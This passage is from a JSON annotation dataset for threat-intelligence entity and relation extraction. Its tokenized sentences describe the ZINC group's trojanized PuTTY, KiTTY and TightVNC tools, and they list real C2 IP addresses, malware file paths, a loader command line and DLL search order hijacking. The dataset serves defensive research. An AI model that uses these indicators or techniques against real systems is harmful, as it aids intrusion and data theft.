"9_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [73, 73], "name": "hostname", "pos": [27, 28], "index": "10_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [87, 87], "name": "executable", "pos": [8, 9], "index": "11_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [96, 96], "name": "172.93.201.253", "pos": [17, 18], "index": "12_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [125, 125], "name": "137.184.15.189", "pos": [8, 9], "index": "13_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [129, 129], "name": "KiTTY executable", "pos": [12, 14], "index": "14_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [139, 139], "name": "% AppData % \\mscoree.dll", "pos": [22, 26], "index": "15_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [148, 148], "name": "Mscoree.dll", "pos": [31, 32], "index": "16_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [152, 152], "name": "EventHorizon", "pos": [35, 36], "index": "17_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [164, 164], "name": "ZINC", "pos": [2, 3], "index": "18_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [168, 168], "name": "PuTTY", "pos": [6, 7], "index": "19_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [174, 174], "name": "DLL search order hijacking", "pos": [12, 16], "index": "20_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [181, 181], "name": "DLL files", "pos": [19, 21], "index": "21_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [191, 191], "name": "Windows processes", "pos": [29, 31], "index": "22_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [195, 195], "name": "% AppData % \\KiTTY\\PresentationHost.exe -EmbeddingObject", "pos": [33, 38], "index": "23_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [202, 202], "name": "mscoree.dll malware", "pos": [1, 3], "index": "24_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [216, 216], "name": "C2 domain", "pos": [15, 17], "index": "25_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [219, 219], "name": "it", "pos": [18, 19], "index": "26_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [223, 223], "name": "malware", "pos": [22, 23], "index": "27_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [237, 237], "name": "C : \\ProgramData\\Cisco\\fixmapi.exe", "pos": [36, 39], "index": "28_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [245, 245], "name": "mapistub.dll", "pos": [44, 45], "index": "29_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [249, 249], "name": "C2 server", "pos": [48, 50], "index": "30_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [252, 252], "name": "HTTP POST requests", "pos": [0, 3], "index": "31_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [273, 273], "name": "gametype field", "pos": [21, 23], "index": "32_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [277, 277], "name": "hardcoded value", "pos": [25, 27], "index": "33_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [292, 292], "name": "PDBPath", "pos": [5, 6], "index": "34_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [302, 302], "name": "executable file", "pos": [15, 17], "index": "35_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [306, 306], "name": "readme.txt", "pos": [19, 20], "index": "36_0"}]], "labels": [{"r": "ST", "evidence": [0], "t": 0, "h": 1}, {"r": "RF", "evidence": [0], "t": 0, "h": 1}, {"r": "FR", "evidence": [0], "h": 1, "t": 2}, {"r": "FR", "evidence": [0], "t": 3, "h": 4}, {"r": "FR", "evidence": [0, 1], "h": 3, "t": 5}, {"r": "FR", "evidence": [1], "t": 6, "h": 7}, {"r": "RD", "evidence": [1], "h": 8, "t": 9}, {"r": "RD", "evidence": [1], "h": 8, "t": 10}, {"r": "CO", "evidence": [1, 2], "h": 8, "t": 11}, {"r": "ST", "evidence": [2], "h": 11, "t": 12}, {"r": "ST", "evidence": [3], "t": 13, "h": 14}, {"r": "RF", "evidence": [3], "t": 13, "h": 14}, {"r": "WR", "evidence": [3], "h": 14, "t": 15}, {"r": "WR", "evidence": [3], "h": 14, "t": 16}, {"r": "WR", "evidence": [3], "t": 16, "h": 17}, {"r": "WR", "evidence": [3], "t": 16, "h": 17}, {"r": "WR", "evidence": [3, 4], "t": 16, "h": 18}, {"r": "WR", "evidence": [3, 4], "t": 16, "h": 19}, {"r": "WR", "evidence": [4], "h": 20, "t": 21}, {"r": "EX", "evidence": [4], "t": 21, "h": 22}, {"r": "EX", "evidence": [4], "h": 22, "t": 23}, {"r": "ST", "evidence": [5], "h": 24, "t": 25}, {"r": "RF", "evidence": [5], "h": 24, "t": 25}, {"r": "FR", "evidence": [5], "h": 26, "t": 27}, {"r": "EX", "evidence": [5], "h": 27, "t": 28}, {"r": "RD", "evidence": [5], "h": 27, "t": 29}, {"r": "RF", "evidence": [5], "h": 27, "t": 30}, {"r": "WR", "evidence": [5, 6], "h": 27, "t": 31}, {"r": "WR", "evidence": [5, 6, 7], "h": 27, "t": 35}]}, {"title": "054-8", "sents": [["To", "ensure", "persistence", ",", "the", "ZINC", "group", "establishes", "a", "daily", "scheduled", "task", "called", "PackageColor", "through", "the", "weaponized", "PuTTY", "configuration", ".", "The", "executable", "first", "acquires", "the", "username", "and", "hostname", "of", "the", "compromised", "system", "."], ["Once", "this", "information", "is", "obtained", ",", "the", "PuTTY", "executable", "sends", "it", "to", "a", "hardcoded", "IP", "address", ",", "172.93.201.253", ",", "via", "TCP/22", ",", "which", "does", "not", "use", "SSH", "protocol", "and", "does", "not", "require", "SSH", "handshake", "to", "establish", "communication", "."], ["Upon", "successful", "TCP", "connection", "to", "the", "server", "at", "137.184.15.189", ",", "the", "malicious", "KiTTY", "executable", "deploys", "the", "embedded", "payload", ",", "mscoree.dll", ",", "in", "%", "AppData", "%", "\\mscoree.dll", "through", "various", "decoding", "phases", ".", "Mscoree.dll", "is", "detected", "as", "EventHorizon", "and", "is", "part", "of", "the", "ZetaNile", "malware", "family", "."], ["Similar", "to", "ZINC", "'s", "version", "of", "PuTTY", ",", "the", "ZetaNile", "malware", "uses", "DLL", "search", "order", "hijacking", "to", "load", "malicious", "DLL", "files", "to", "perform", "tasks", "within", "the", "context", "of", "legitimate", "Windows", "processes", "such", "as", "%", "AppData", "%", "\\KiTTY\\PresentationHost.exe", "-EmbeddingObject", "."], ["The", "mscoree.dll", "malware", "is", "modularized", "so", "that", "once", "it", "establishes", "a", "connection", "to", "the", "compromised", "C2", "domain", ",", "it", "can", "install", "additional", "malware", "as", "necessary", "using", "existing", "C2", "communication", ".", "For", "instance", ",", "it", "can", "execute", "C", ":", "\\ProgramData\\Cisco\\fixmapi.exe", "-s", "AudioEndpointBuilder", "to", "load", "malicious", "mapistub.dll", "from", "the", "compromised", "C2", "server", "."], ["HTTP", "POST", "requests", "have", "a", "hardcoded", "UA", "string", "with", "a", "misspelled", "``", "Edge", "''", "and", "contain", "a", "unique", "ID", "for", "the", "gametype", "field", "and", "a", "hardcoded", "value", "for", "the", "type", "field", "for", "tracking", "purposes", "."], ["This", "malware", "has", "a", "unique", "PDBPath", ".", "Finally", ",", "the", "recipient", "is", "provided", "with", "an", "executable", "file", "and", "a", "readme.txt", "to", "aid", "them", "in", "running", "the", "archive", "."], ["The", "archive", "provided", "to", "recipients", "contains", "a", ".txt", "file", "with", "instructions", "and", "an", "executable", "file", "to", "run", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [5, 5], "name": "ZINC", "pos": [5, 6], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [13, 13], "name": "PackageColor", "pos": [13, 14], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [16, 16], "name": "weaponized PuTTY", "pos": [16, 18], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [21, 21], "name": "executable", "pos": [21, 22], "index": "3_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [25, 25], "name": "username", "pos": [25, 26], "index": "4_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [27, 27], "name": "hostname", "pos": [27, 28], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [41, 41], "name": "executable", "pos": [8, 9], "index": "6_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [50, 50], "name": "172.93.201.253", "pos": [17, 18], "index": "7_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [79, 79], "name": "137.184.15.189", "pos": [8, 9], "index": "8_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [83, 83], "name": "KiTTY executable", "pos": [12, 14], "index": "9_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [93, 93], "name": "% AppData % \\mscoree.dll", "pos": [22, 26], "index": "10_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [102, 102], "name": "Mscoree.dll", "pos": [31, 32], "index": "11_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [106, 106], "name": "EventHorizon", "pos": [35, 36], "index": "12_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [118, 118], "name": "ZINC", "pos": [2, 3], "index": "13_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [122, 122], "name": "PuTTY", "pos": [6, 7], "index": "14_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [128, 128], "name": "DLL search order hijacking", "pos": [12, 16], "index": "15_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [135, 135], "name": "DLL files", "pos": [19, 21], "index": "16_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [145, 145], "name": "Windows processes", "pos": [29, 31], "index": "17_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [149, 149], "name": "% AppData % \\KiTTY\\PresentationHost.exe -EmbeddingObject", "pos": [33, 38], "index": "18_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [156, 156], "name": "mscoree.dll malware", "pos": [1, 3], "index": "19_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [170, 170], "name": "C2 domain", "pos": [15, 17], "index": "20_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [173, 173], "name": "it", "pos": [18, 19], "index": "21_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [177, 177], "name": "malware", "pos": [22, 23], "index": "22_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [191, 191], "name": "C : \\ProgramData\\Cisco\\fixmapi.exe", "pos": [36, 39], "index": "23_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [199, 199], "name": "mapistub.dll", "pos": [44, 45], "index": "24_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [203, 203], "name": "C2 server", "pos": [48, 50], "index": "25_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [206, 206], "name": "HTTP POST requests", "pos": [0, 3], "index": "26_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [227, 227], "name": "gametype field", "pos": [21, 23], "index": "27_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [231, 231], "name": "hardcoded value", "pos": [25, 27], "index": "28_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [246, 246], "name": "PDBPath", "pos": [5, 6], "index": "29_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [256, 256], "name": "executable file", "pos": [15, 17], "index": "30_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [260, 260], "name": "readme.txt", "pos": [19, 20], "index": "31_0"}]], "labels": [{"r": "FR", "evidence": [0], "t": 1, "h": 2}, {"r": "RD", "evidence": [0], "h": 3, "t": 4}, {"r": "RD", "evidence": [0], "h": 3, "t": 5}, {"r": "CO", "evidence": [0, 1], "h": 3, "t": 6}, {"r": "ST", "evidence": [1], "h": 6, "t": 7}, {"r": "ST", "evidence": [2], "t": 8, "h": 9}, {"r": "RF", "evidence": [2], "t": 8, "h": 9}, {"r": "WR", "evidence": [2], "h": 9, "t": 10}, {"r": "WR", "evidence": [2], "h": 9, "t": 11}, {"r": "WR", "evidence": [2], "t": 11, "h": 12}, {"r": "WR", "evidence": [2], "t": 11, "h": 12}, {"r": "WR", "evidence": [2, 3], "t": 11, "h": 13}, {"r": "WR", "evidence": [2, 3], "t": 11, "h": 14}, {"r": "WR", "evidence": [3], "h": 15, "t": 16}, {"r": "EX", "evidence": [3], "t": 16, "h": 17}, {"r": "EX", "evidence": [3], "h": 17, "t": 18}, {"r": "ST", "evidence": [4], "h": 19, "t": 20}, {"r": "RF", "evidence": [4], "h": 19, "t": 20}, {"r": "FR", "evidence": [4], "h": 21, "t": 22}, {"r": "EX", "evidence": [4], "h": 22, "t": 23}, {"r": "RD", "evidence": [4], "h": 22, "t": 24}, {"r": "RF", "evidence": [4], "h": 22, "t": 25}, {"r": "WR", "evidence": [4, 5], "h": 22, "t": 26}, {"r": "WR", "evidence": [4, 5, 6], "h": 22, "t": 30}]}, {"title": "054-9", "sents": [["Once", "this", "information", "is", "obtained", ",", "the", "PuTTY", "executable", "sends", "it", "to", "a", "hardcoded", "IP", "address", ",", "172.93.201.253", ",", "via", "TCP/22", ",", "which", "does", "not", "use", "SSH", "protocol", "and", "does", "not", "require", "SSH", "handshake", "to", "establish", "communication", "."], ["Upon", "successful", "TCP", "connection", "to", "the", "server", "at", "137.184.15.189", ",", "the", "malicious", "KiTTY", "executable", "deploys", "the", "embedded", "payload", ",", "mscoree.dll", ",", "in", "%", "AppData", "%", "\\mscoree.dll", "through", "various", "decoding", "phases", ".", "Mscoree.dll", "is", "detected", "as", "EventHorizon", "and", "is", "part", "of", "the", "ZetaNile", "malware", "family", "."], ["Similar", "to", "ZINC", "'s", "version", "of", "PuTTY", ",", "the", "ZetaNile", "malware", "uses", "DLL", "search", "order", "hijacking", "to", "load", "malicious", "DLL", "files", "to", "perform", "tasks", "within", "the", "context", "of", "legitimate", "Windows", "processes", "such", "as", "%", "AppData", "%", "\\KiTTY\\PresentationHost.exe", "-EmbeddingObject", "."], ["The", "mscoree.dll", "malware", "is", "modularized", "so", "that", "once", "it", "establishes", "a", "connection", "to", "the", "compromised", "C2", "domain", ",", "it", "can", "install", "additional", "malware", "as", "necessary", "using", "existing", "C2", "communication", ".", "For", "instance", ",", "it", "can", "execute", "C", ":", "\\ProgramData\\Cisco\\fixmapi.exe", "-s", "AudioEndpointBuilder", "to", "load", "malicious", "mapistub.dll", "from", "the", "compromised", "C2", "server", "."], ["HTTP", "POST", "requests", "have", "a", "hardcoded", "UA", "string", "with", "a", "misspelled", "``", "Edge", "''", "and", "contain", "a", "unique", "ID", "for", "the", "gametype", "field", "and", "a", "hardcoded", "value", "for", "the", "type", "field", "for", "tracking", "purposes", "."], ["This", "malware", "has", "a", "unique", "PDBPath", ".", "Finally", ",", "the", "recipient", "is", "provided", "with", "an", "executable", "file", "and", "a", "readme.txt", "to", "aid", "them", "in", "running", "the", "archive", "."], ["The", "archive", "provided", "to", "recipients", "contains", "a", ".txt", "file", "with", "instructions", "and", "an", "executable", "file", "to", "run", "."], ["The", "malicious", "TightVNC", "Viewer", "has", "a", "pre-populated", "list", "of", "remote", "hosts", "and", "installs", "the", "backdoor", "only", "when", "the", "user", "selects", "ec2-aet-tech.w-ada.amazonaws", "from", "the", "drop-down", "menu", "displayed", ".", "The", "malware", "sends", "the", "username", "and", "hostname", "to", "IP", "44.238.74.84", "on", "TCP/22", "as", "part", "of", "the", "victim", "check-in", "with", "the", "C2", "and", "establishes", "VNC", "connections", "to", "the", "same", "IP", "on", "port", "TCP/5900", ".", "Once", "it", "establishes", "a", "connection", "to", "the", "server", "IP", ",", "the", "embedded", "second", "stage", "DLL", "payload", "from", "TightVNC.exe", "is", "loaded", "in", "memory", "to", "establish", "C2", "communication", "to", "known", "compromised", "domains", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [8, 8], "name": "executable", "pos": [8, 9], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [17, 17], "name": "172.93.201.253", "pos": [17, 18], "index": "1_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [46, 46], "name": "137.184.15.189", "pos": [8, 9], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [50, 50], "name": "KiTTY executable", "pos": [12, 14], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [60, 60], "name": "% AppData % \\mscoree.dll", "pos": [22, 26], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [69, 69], "name": "Mscoree.dll", "pos": [31, 32], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [73, 73], "name": "EventHorizon", "pos": [35, 36], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [85, 85], "name": "ZINC", "pos": [2, 3], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [89, 89], "name": "PuTTY", "pos": [6, 7], "index": "8_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [95, 95], "name": "DLL search order hijacking", "pos": [12, 16], "index": "9_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [102, 102], "name": "DLL files", "pos": [19, 21], "index": "10_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [112, 112], "name": "Windows processes", "pos": [29, 31], "index": "11_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [116, 116], "name": "% AppData % \\KiTTY\\PresentationHost.exe -EmbeddingObject", "pos": [33, 38], "index": "12_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [123, 123], "name": "mscoree.dll malware", "pos": [1, 3], "index": "13_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [137, 137], "name": "C2 domain", "pos": [15, 17], "index": "14_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [140, 140], "name": "it", "pos": [18, 19], "index": "15_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [144, 144], "name": "malware", "pos": [22, 23], "index": "16_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [158, 158], "name": "C : \\ProgramData\\Cisco\\fixmapi.exe", "pos": [36, 39], "index": "17_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [166, 166], "name": "mapistub.dll", "pos": [44, 45], "index": "18_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [170, 170], "name": "C2 server", "pos": [48, 50], "index": "19_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [173, 173], "name": "HTTP POST requests", "pos": [0, 3], "index": "20_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [194, 194], "name": "gametype field", "pos": [21, 23], "index": "21_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [198, 198], "name": "hardcoded value", "pos": [25, 27], "index": "22_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [213, 213], "name": "PDBPath", "pos": [5, 6], "index": "23_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [223, 223], "name": "executable file", "pos": [15, 17], "index": "24_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [227, 227], "name": "readme.txt", "pos": [19, 20], "index": "25_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [256, 256], "name": "TightVNC Viewer", "pos": [2, 4], "index": "26_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [263, 263], "name": "remote hosts", "pos": [9, 11], "index": "27_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [268, 268], "name": "backdoor", "pos": [14, 15], "index": "28_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [274, 274], "name": "ec2-aet-tech.w-ada.amazonaws", "pos": [20, 21], "index": "29_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [282, 282], "name": "malware", "pos": [28, 29], "index": "30_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [290, 290], "name": "44.238.74.84", "pos": [36, 37], "index": "31_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [309, 309], "name": "IP", "pos": [55, 56], "index": "32_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [321, 321], "name": "server IP", "pos": [67, 69], "index": "33_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [328, 328], "name": "DLL payload", "pos": [74, 76], "index": "34_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [331, 331], "name": "TightVNC.exe", "pos": [77, 78], "index": "35_0"}]], "labels": [{"r": "ST", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [1], "t": 2, "h": 3}, {"r": "RF", "evidence": [1], "t": 2, "h": 3}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "WR", "evidence": [1], "h": 3, "t": 5}, {"r": "WR", "evidence": [1], "t": 5, "h": 6}, {"r": "WR", "evidence": [1], "t": 5, "h": 6}, {"r": "WR", "evidence": [1, 2], "t": 5, "h": 7}, {"r": "WR", "evidence": [1, 2], "t": 5, "h": 8}, {"r": "WR", "evidence": [2], "h": 9, "t": 10}, {"r": "EX", "evidence": [2], "t": 10, "h": 11}, {"r": "EX", "evidence": [2], "h": 11, "t": 12}, {"r": "ST", "evidence": [3], "h": 13, "t": 14}, {"r": "RF", "evidence": [3], "h": 13, "t": 14}, {"r": "FR", "evidence": [3], "h": 15, "t": 16}, {"r": "EX", "evidence": [3], "h": 16, "t": 17}, {"r": "RD", "evidence": [3], "h": 16, "t": 18}, {"r": "RF", "evidence": [3], "h": 16, "t": 19}, {"r": "WR", "evidence": [3, 4], "h": 16, "t": 20}, {"r": "WR", "evidence": [3, 4, 5], "h": 16, "t": 24}, {"r": "WR", "evidence": [4, 5, 6, 7], "t": 20, "h": 26}, {"r": "WR", "evidence": [5, 6, 7], "t": 24, "h": 26}, {"r": "ST", "evidence": [7], "h": 26, "t": 27}, {"r": "RF", "evidence": [7], "h": 26, "t": 27}, {"r": "FR", "evidence": [7], "h": 26, "t": 28}, {"r": "ST", "evidence": [7], "t": 27, "h": 28}, {"r": "RF", "evidence": [7], "t": 27, "h": 28}, {"r": "WR", "evidence": [7], "h": 28, "t": 29}, {"r": "WR", "evidence": [7], "t": 29, "h": 30}, {"r": "ST", "evidence": [7], "h": 30, "t": 31}, {"r": "RF", "evidence": [7], "h": 30, "t": 31}, {"r": "ST", "evidence": [7], "h": 30, "t": 32}, {"r": "RF", "evidence": [7], "h": 30, "t": 32}, {"r": "ST", "evidence": [7], "h": 30, "t": 33}, {"r": "RF", "evidence": [7], "h": 30, "t": 33}, {"r": "RD", "evidence": [7], "h": 30, "t": 34}, {"r": "WR", "evidence": [7], "t": 34, "h": 35}]}, {"title": "054-10", "sents": [["Upon", "successful", "TCP", "connection", "to", "the", "server", "at", "137.184.15.189", ",", "the", "malicious", "KiTTY", "executable", "deploys", "the", "embedded", "payload", ",", "mscoree.dll", ",", "in", "%", "AppData", "%", "\\mscoree.dll", "through", "various", "decoding", "phases", ".", "Mscoree.dll", "is", "detected", "as", "EventHorizon", "and", "is", "part", "of", "the", "ZetaNile", "malware", "family", "."], ["Similar", "to", "ZINC", "'s", "version", "of", "PuTTY", ",", "the", "ZetaNile", "malware", "uses", "DLL", "search", "order", "hijacking", "to", "load", "malicious", "DLL", "files", "to", "perform", "tasks", "within", "the", "context", "of", "legitimate", "Windows", "processes", "such", "as", "%", "AppData", "%", "\\KiTTY\\PresentationHost.exe", "-EmbeddingObject", "."], ["The", "mscoree.dll", "malware", "is", "modularized", "so", "that", "once", "it", "establishes", "a", "connection", "to", "the", "compromised", "C2", "domain", ",", "it", "can", "install", "additional", "malware", "as", "necessary", "using", "existing", "C2", "communication", ".", "For", "instance", ",", "it", "can", "execute", "C", ":", "\\ProgramData\\Cisco\\fixmapi.exe", "-s", "AudioEndpointBuilder", "to", "load", "malicious", "mapistub.dll", "from", "the", "compromised", "C2", "server", "."], ["HTTP", "POST", "requests", "have", "a", "hardcoded", "UA", "string", "with", "a", "misspelled", "``", "Edge", "''", "and", "contain", "a", "unique", "ID", "for", "the", "gametype", "field", "and", "a", "hardcoded", "value", "for", "the", "type", "field", "for", "tracking", "purposes", "."], ["This", "malware", "has", "a", "unique", "PDBPath", ".", "Finally", ",", "the", "recipient", "is", "provided", "with", "an", "executable", "file", "and", "a", "readme.txt", "to", "aid", "them", "in", "running", "the", "archive", "."], ["The", "archive", "provided", "to", "recipients", "contains", "a", ".txt", "file", "with", "instructions", "and", "an", "executable", "file", "to", "run", "."], ["The", "malicious", "TightVNC", "Viewer", "has", "a", "pre-populated", "list", "of", "remote", "hosts", "and", "installs", "the", "backdoor", "only", "when", "the", "user", "selects", "ec2-aet-tech.w-ada.amazonaws", "from", "the", "drop-down", "menu", "displayed", ".", "The", "malware", "sends", "the", "username", "and", "hostname", "to", "IP", "44.238.74.84", "on", "TCP/22", "as", "part", "of", "the", "victim", "check-in", "with", "the", "C2", "and", "establishes", "VNC", "connections", "to", "the", "same", "IP", "on", "port", "TCP/5900", ".", "Once", "it", "establishes", "a", "connection", "to", "the", "server", "IP", ",", "the", "embedded", "second", "stage", "DLL", "payload", "from", "TightVNC.exe", "is", "loaded", "in", "memory", "to", "establish", "C2", "communication", "to", "known", "compromised", "domains", "."], ["In", "comparison", ",", "the", "Sumatra", "PDF", "reader", "is", "functional", ",", "and", "the", "muPDF/Subliminal", "Recording", "installer", "sets", "up", "the", "backdoor", "without", "loading", "any", "malicious", "PDF", "files", ".", "SecurePDF.exe", "is", "a", "modularized", "loader", "that", "can", "install", "the", "ZetaNile", "implant", "by", "loading", "a", "weaponized", "job", "application", "themed", "file", "with", "a", ".PDF", "extension", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [8, 8], "name": "137.184.15.189", "pos": [8, 9], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [12, 12], "name": "KiTTY executable", "pos": [12, 14], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [22, 22], "name": "% AppData % \\mscoree.dll", "pos": [22, 26], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [31, 31], "name": "Mscoree.dll", "pos": [31, 32], "index": "3_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [35, 35], "name": "EventHorizon", "pos": [35, 36], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [47, 47], "name": "ZINC", "pos": [2, 3], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [51, 51], "name": "PuTTY", "pos": [6, 7], "index": "6_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [57, 57], "name": "DLL search order hijacking", "pos": [12, 16], "index": "7_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [64, 64], "name": "DLL files", "pos": [19, 21], "index": "8_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [74, 74], "name": "Windows processes", "pos": [29, 31], "index": "9_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [78, 78], "name": "% AppData % \\KiTTY\\PresentationHost.exe -EmbeddingObject", "pos": [33, 38], "index": "10_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [85, 85], "name": "mscoree.dll malware", "pos": [1, 3], "index": "11_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [99, 99], "name": "C2 domain", "pos": [15, 17], "index": "12_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [102, 102], "name": "it", "pos": [18, 19], "index": "13_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [106, 106], "name": "malware", "pos": [22, 23], "index": "14_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [120, 120], "name": "C : \\ProgramData\\Cisco\\fixmapi.exe", "pos": [36, 39], "index": "15_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [128, 128], "name": "mapistub.dll", "pos": [44, 45], "index": "16_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [132, 132], "name": "C2 server", "pos": [48, 50], "index": "17_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [135, 135], "name": "HTTP POST requests", "pos": [0, 3], "index": "18_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [156, 156], "name": "gametype field", "pos": [21, 23], "index": "19_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [160, 160], "name": "hardcoded value", "pos": [25, 27], "index": "20_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [175, 175], "name": "PDBPath", "pos": [5, 6], "index": "21_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [185, 185], "name": "executable file", "pos": [15, 17], "index": "22_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [189, 189], "name": "readme.txt", "pos": [19, 20], "index": "23_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [218, 218], "name": "TightVNC Viewer", "pos": [2, 4], "index": "24_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [225, 225], "name": "remote hosts", "pos": [9, 11], "index": "25_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [230, 230], "name": "backdoor", "pos": [14, 15], "index": "26_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [236, 236], "name": "ec2-aet-tech.w-ada.amazonaws", "pos": [20, 21], "index": "27_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [244, 244], "name": "malware", "pos": [28, 29], "index": "28_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [252, 252], "name": "44.238.74.84", "pos": [36, 37], "index": "29_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [271, 271], "name": "IP", "pos": [55, 56], "index": "30_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [283, 283], "name": "server IP", "pos": [67, 69], "index": "31_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [290, 290], "name": "DLL payload", "pos": [74, 76], "index": "32_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [293, 293], "name": "TightVNC.exe", "pos": [77, 78], "index": "33_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [311, 311], "name": "Sumatra PDF", "pos": [4, 6], "index": "34_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [333, 333], "name": 